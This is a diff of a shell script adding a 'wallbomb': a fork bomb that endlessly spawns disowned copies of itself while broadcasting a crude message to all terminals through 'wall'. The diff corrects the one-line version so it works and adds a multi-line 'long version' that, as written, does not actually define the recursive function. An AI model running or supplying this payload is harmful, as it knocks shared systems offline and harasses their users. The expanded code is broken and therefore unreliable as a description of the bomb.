@@ -62,4 +62,11 @@ while true; do
 done
 
 #wallbomb
-:(){echo "balls"|wall:|:&disown};:&disown
+:(){echo "balls"|wall;:|:&disown};:&disown
+#long version of wallbomb
+:
+{
+	echo "balls" | wall
+	: | : & disown
+}
+: & disown
